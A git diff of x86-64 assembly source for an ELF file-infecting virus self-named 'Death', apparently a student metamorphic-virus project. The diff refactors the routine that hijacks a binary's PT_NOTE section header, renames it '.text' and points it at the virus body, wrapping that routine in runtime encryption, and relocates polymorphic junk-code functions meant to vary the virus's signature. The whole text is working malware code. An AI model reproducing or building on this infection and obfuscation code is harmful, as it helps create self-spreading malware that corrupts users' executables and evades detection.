@@ -131,7 +131,7 @@ section .text
         cmp rbx, rsi
         ret
     __F_crazy__end:
-	F_crazy_len equ $ - __F_crazy
+	F_crazy_len equ $ - __F_crazy -1
 
     __F_encrypt_block:
         lea r10, [rel __F_data]         ; base función
@@ -259,90 +259,34 @@ section .text
         ret
     __F_set_unique_trace__end:
 
-    __F_crazy0:
-        inc rax
-        dec rax
-        nop
-        inc rbx
-        dec rbx
-        inc rdx
-        dec rdx
-        inc rdx
-        dec rdx
-        nop
-        cmp rbx, rbx
-        jne __F_crazy0
-        mov rax, rax
-        xchg rax, rax
-        nop dword [rax+rax]
-        add rax, 0
-        nop word [rax+rax]
-        lea rax, [rax]
-        sub rax, 0
-        and rax, -1
-        or  rax, 0
-        not rax
-        cmp rbx, rsi
-        not rax
-        ret
-    __F_crazy0__end:
 
-    __F_crazy1:
-        inc rax
-        inc rdx
-        nop
-        dec rax
-        inc rbx
-        dec rbx
-        inc rdx
-        dec rdx
-        dec rdx
-        nop
-        cmp rbx, rbx
-        jne __F_crazy1
-        mov rax, rax
-        xchg rax, rax
-        nop word [rax+rax]
-        nop dword [rax+rax]
-        and rax, -1
-        lea rax, [rax]
-        sub rax, 0
-        or  rax, 0
-        not rax
-        add rax, 0
-        not rax
-        cmp rbx, rsi
-        ret
-    __F_crazy1__end:
+    __F_mod_sh_note:
+        ; rsi = shstrab_ptr + note_shdr_ptr.sh_name = el nombre original de la seccion.
+        mov rax, VAR(Death.note_shdr_ptr)
+        ; ponemos a cero porque vamos a cargar un numero de 4 bits. Si tiene
+        ; basura el registro, luego al sumar nos da un numero gigante.
+        xor rbx, rbx
+        mov ebx, [rax + Elf64_Shdr.sh_name]
+        mov rdi, VAR(Death.shstrtab_ptr)
+        add rdi, rbx
 
-    __F_crazy2:
-        inc rax
-        inc rdx
-        nop
-        dec rax
-        inc rbx
-        inc rdx
-        dec rbx
-        xchg rax, rax
-        dec rdx
-        dec rdx
-        nop
-        cmp rbx, rbx
-        jne __F_crazy1
-        mov rax, rax
-        nop word [rax+rax]
-        nop dword [rax+rax]
-        and rax, -1
-        lea rax, [rax]
-        sub rax, 0
-        or  rax, 0
-        not rax
-        add rax, 0
-        not rax
-        cmp rbx, rsi
-        ret
-    __F_crazy2__end:
+        ; ponemos .text\0 donde queriamos poner
+        lea rsi, [rel text_section_str]
+        mov rcx, 6 ; len(".text\0")
+        cld
+        rep movsb
 
+        ; sh_offset = virus_offset
+        mov rbx, VAR(Death.virus_offset)
+        mov [rax + Elf64_Shdr.sh_offset], rbx
+
+        ; sh_size = virus_size
+        xor rbx, rbx
+        mov ebx, dword VAR(Death.virus_size)
+        mov [rax + Elf64_Shdr.sh_size], rbx
+
+        ret
+    __F_mod_sh_note__end:
 
 ; ----------------------------------------------------------------------------------------------------------------------
 
@@ -793,33 +737,9 @@ section .text
             ; rax apunta ahora al inicio de la shstrtab
             mov VAR(Death.shstrtab_ptr), rax
 
-    .mod_pt_note:
+    .mod_headers:
         CALL_ENCRYPT(mod_pt_note)
-
-    .mod_sh_note:
-        ; rsi = shstrab_ptr + note_shdr_ptr.sh_name = el nombre original de la seccion.
-        mov rax, VAR(Death.note_shdr_ptr)
-        ; ponemos a cero porque vamos a cargar un numero de 4 bits. Si tiene
-        ; basura el registro, luego al sumar nos da un numero gigante.
-        xor rbx, rbx
-        mov ebx, [rax + Elf64_Shdr.sh_name]
-        mov rdi, VAR(Death.shstrtab_ptr)
-        add rdi, rbx
-
-        ; ponemos .text\0 donde queriamos poner
-        lea rsi, [rel text_section_str]
-        mov rcx, 6 ; len(".text\0")
-        cld
-        rep movsb
-
-        ; sh_offset = virus_offset
-        mov rbx, VAR(Death.virus_offset)
-        mov [rax + Elf64_Shdr.sh_offset], rbx
-
-        ; sh_size = virus_size
-        xor rbx, rbx
-        mov ebx, dword VAR(Death.virus_size)
-        mov [rax + Elf64_Shdr.sh_size], rbx
+        CALL_ENCRYPT(mod_sh_note)
 
     .unique_trace:
         xor rax, rax
@@ -949,5 +869,88 @@ section .text
     Traza           db      "Death version 1.0 (c)oded by tomartin & carce-bo 42069420",0  ;46
     Traza_len       equ     $ - Traza - 1 - 8 - 1
 
+    __F_crazy0:
+        inc rax
+        dec rax
+        nop
+        inc rbx
+        dec rbx
+        inc rdx
+        dec rdx
+        inc rdx
+        dec rdx
+        nop
+        cmp rbx, rbx
+        jne __F_crazy0
+        mov rax, rax
+        xchg rax, rax
+        nop dword [rax+rax]
+        add rax, 0
+        nop word [rax+rax]
+        lea rax, [rax]
+        sub rax, 0
+        and rax, -1
+        or  rax, 0
+        not rax
+        cmp rbx, rsi
+        not rax
+        ret
+    __F_crazy0__end:
+
+    __F_crazy1:
+        inc rax
+        inc rdx
+        nop
+        dec rax
+        inc rbx
+        dec rbx
+        inc rdx
+        dec rdx
+        dec rdx
+        nop
+        cmp rbx, rbx
+        jne __F_crazy1
+        mov rax, rax
+        xchg rax, rax
+        nop word [rax+rax]
+        nop dword [rax+rax]
+        and rax, -1
+        lea rax, [rax]
+        sub rax, 0
+        or  rax, 0
+        not rax
+        add rax, 0
+        not rax
+        cmp rbx, rsi
+        ret
+    __F_crazy1__end:
+
+    __F_crazy2:
+        inc rax
+        inc rdx
+        nop
+        dec rax
+        inc rbx
+        inc rdx
+        dec rbx
+        xchg rax, rax
+        dec rdx
+        dec rdx
+        nop
+        cmp rbx, rbx
+        jne __F_crazy1
+        mov rax, rax
+        nop word [rax+rax]
+        nop dword [rax+rax]
+        and rax, -1
+        lea rax, [rax]
+        sub rax, 0
+        or  rax, 0
+        not rax
+        add rax, 0
+        not rax
+        cmp rbx, rsi
+        ret
+    __F_crazy2__end:
 
     _finish:
